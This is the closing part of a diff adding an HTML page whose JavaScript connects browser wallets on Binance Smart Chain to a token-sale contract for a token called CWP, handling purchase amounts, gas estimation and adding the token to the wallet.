+                "stateMutability": "nonpayable",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "buyTokens",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "payable",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "checkFundAllowed",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{
+                    "internalType": "address payable",
+                    "name": "",
+                    "type": "address"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "rate",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "rewards",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [{
+                    "internalType": "uint256",
+                    "name": "_airdrop",
+                    "type": "uint256"
+                }, {
+                    "internalType": "uint256",
+                    "name": "_rewards",
+                    "type": "uint256"
+                }],
+                "name": "setDrop",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }, {
+                "inputs": [{
+                    "internalType": "uint256",
+                    "name": "_rate",
+                    "type": "uint256"
+                }],
+                "name": "setPrice",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "token",
+                "outputs": [{
+                    "internalType": "contract IBEP20",
+                    "name": "",
+                    "type": "address"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }];
+            let contract_address = "0x5EA6b858dd5EAA1851da7E65d63a1B9D2f46b045";
+            contract = new web3.eth.Contract(contract_abi, contract_address);
+            rate = ((await contract.methods.rate().call()) / (10 ** 18));
+        }
+        async function refreshAccountData() {
+            document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+            await fetchAccountData();
+        }
+        async function onConnect() {
+            try {
+                provider = new WalletConnectProvider({
+                    infuraId: "4e990aac9bc9418b8112eb1ed524cf91",
+                    rpc: {
+                        56: "https://bsc-dataseed.binance.org/",
+                    },
+                    chainId: 56,
+                    qrcode: true,
+                    qrcodeModalOptions: {
+                        mobileLinks: [
+                            "metamask",
+                            "trust",
+                        ],
+                    },
+                });
+                await provider.enable();
+                const web3 = new Web3(provider);
+                let chainId = await web3.eth.getChainId();
+
+                if (chainId == 97 || chainId == 56) {
+                    await refreshAccountData();
+                    document.querySelector("#alert-error-https").style.display = "none";
+
+                } else {
+                    onDisconnect();
+                }
+
+
+                $('#exampleModalCenter').modal('toggle');
+            } catch (e) {
+                swal('error', 'this is not BSC Smart Chain browser, try via WALLET CONNECT.', 'error');
+                return;
+            }
+            await refreshAccountData();
+            wallet_type = 1;
+        }
+        async function demo() {
+            try {
+                window.ethereum.enable();
+                provider = await window.web3.currentProvider;
+            } catch (e) {
+                swal('error', 'this is not BSC Smart Chain browser, try via WALLET CONNECT.', 'error');
+                return;
+            }
+            provider.on("accountsChanged", (accounts) => {
+                fetchAccountData();
+            });
+            provider.on("chainChanged", (chainId) => {
+                if (chainId == 97 || chainId == 56) {
+                    fetchAccountData();
+                    document.querySelector("#alert-error-https").style.display = "none";
+
+                } else {
+                    onDisconnect();
+                }
+            });
+            await refreshAccountData();
+            $('#exampleModalCenter').modal('toggle');
+            wallet_type = 2;
+        }
+        async function bsc() {
+            try {
+                window.BinanceChain.enable();
+
+                provider = window.BinanceChain;
+            } catch (e) {
+                swal('error', 'this is not ethereum browser', 'error');
+                return;
+            }
+            const web3 = new Web3(provider);
+            console.log(web3);
+            let chainId = await web3.eth.getChainId();
+            console.log(chainId);
+            if (chainId == 97 || chainId == 56) {
+                await refreshAccountData();
+                document.querySelector("#alert-error-https").style.display = "none";
+
+            } else {
+                onDisconnect();
+            }
+
+            $('#exampleModalCenter').modal('toggle');
+            wallet_type = 3;
+        }
+        async function onDisconnect() {
+            if (provider.close) {
+                await provider.close();
+                //await web3Modal.clearCachedProvider();
+                provider = null;
+            }
+            selectedAccount = null;
+            document.querySelector("#selected-balance").textContent = 0.00;
+            document.querySelector("#btn-connect").textContent = "Connect";
+            document.querySelector("#btn-connect").removeAttribute("disabled")
+            document.querySelector("#alert-error-https").style.display = "block";
+            document.querySelector("#alert-error-https").textContent = "Please choose BSC Network";
+            document.querySelector("#pay").textContent = "Unlock Wallet";
+
+            document.querySelector("#btn-disconnect").style.display = "none";
+        }
+
+        function convert() {
+            var no_of_eth = Number(document.getElementById('formGroupExampleInput').value);
+            var inputtxt = document.getElementById('formGroupExampleInput');
+            var numbers = /^[0-9]+/;
+            if (inputtxt.value.match(numbers)) {
+                var no_token = ((no_of_eth / rate));
+                console.log(no_token)
+                document.getElementById('formGroupExampleInput2').value = Number(no_token);
+                document.getElementById("pay").disabled = false;
+            } else {
+                document.getElementById('formGroupExampleInput2').value = '';
+                document.getElementById("pay").disabled = true;
+            }
+        }
+        async function max() {
+            const web3 = new Web3(provider);
+            var no_of_eth = Number(humanFriendlyBalance);
+            console.log(wallet_type);
+            if (wallet_type == 1) {
+                var no_eth = Number(humanFriendlyBalance * (10 ** 18));
+                console.log(no_eth);
+            } else {
+                var no_eth = Number(humanFriendlyBalance * (10 ** 14));
+                console.log(no_eth);
+            }
+            let contract_abi = [{
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            }, {
+                "inputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "name": "_airaddress",
+                "outputs": [{
+                    "internalType": "address",
+                    "name": "",
+                    "type": "address"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "airdrop",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [{
+                    "internalType": "address",
+                    "name": "ref_address",
+                    "type": "address"
+                }],
+                "name": "airdropTokens",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "buyTokens",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "payable",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "checkFundAllowed",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{
+                    "internalType": "address payable",
+                    "name": "",
+                    "type": "address"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "rate",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "rewards",
+                "outputs": [{
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }, {
+                "inputs": [{
+                    "internalType": "uint256",
+                    "name": "_airdrop",
+                    "type": "uint256"
+                }, {
+                    "internalType": "uint256",
+                    "name": "_rewards",
+                    "type": "uint256"
+                }],
+                "name": "setDrop",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }, {
+                "inputs": [{
+                    "internalType": "uint256",
+                    "name": "_rate",
+                    "type": "uint256"
+                }],
+                "name": "setPrice",
+                "outputs": [{
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }, {
+                "inputs": [],
+                "name": "token",
+                "outputs": [{
+                    "internalType": "contract IBEP20",
+                    "name": "",
+                    "type": "address"
+                }],
+                "stateMutability": "view",
+                "type": "function"
+            }];
+            let contract_address = "0x5EA6b858dd5EAA1851da7E65d63a1B9D2f46b045";
+            contract = new web3.eth.Contract(contract_abi, contract_address);
+            web3.eth.getGasPrice().then(gasPrice => {
+                contract.methods.buyTokens().estimateGas({
+                        from: selectedAccount,
+                        value: no_eth
+                    })
+                    .then(result => {
+                        var result = result * 2;
+                        var final_price = ((result * gasPrice) / (10 ** 18));
+                        var remaining = parseFloat(no_of_eth - final_price).toFixed(5);
+                        document.getElementById('formGroupExampleInput').value = (remaining);
+                        var inputtxt = document.getElementById('formGroupExampleInput');
+                        var numbers = /^[0-9]+/;
+                        if (inputtxt.value.match(numbers)) {
+                            var no_token = ((no_of_eth / rate));
+                            document.getElementById('formGroupExampleInput2').value = Number(no_token);
+                            document.getElementById("pay").disabled = false;
+                        } else {
+                            document.getElementById('formGroupExampleInput2').value = '';
+                            document.getElementById("pay").disabled = true;
+                        }
+                    });
+            });
+
+
+        }
+        async function add() {
+            const tokenAddress = '0x5EA6b858dd5EAA1851da7E65d63a1B9D2f46b045';
+            const tokenSymbol = 'CWP';
+            const tokenDecimals = 18;
+            const tokenImage = 'https://cleanwaterpeoject.netlify.app/assets/img/logo/logo.png';
+
+            try {
+                // wasAdded is a boolean. Like any RPC method, an error may be thrown.
+                const wasAdded = await ethereum.request({
+
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20', // Initially only supports ERC20, but eventually more!
+                        options: {
+                            address: tokenAddress, // The address that the token is at.
+                            symbol: tokenSymbol, // A ticker symbol or shorthand, up to 5 chars.
+                            decimals: tokenDecimals, // The number of decimals in the token
+                            image: tokenImage, // A string url of the token logo
+                        },
+                    },
+                });
+
+                if (wasAdded) {
+                    console.log('Thanks for your interest!');
+                } else {
+                    console.log('Your loss!');
+                }
+            } catch (error) {
+                console.log(error);
+            }
+        }
+    </script>
+
+
+</body>
+
+</html>
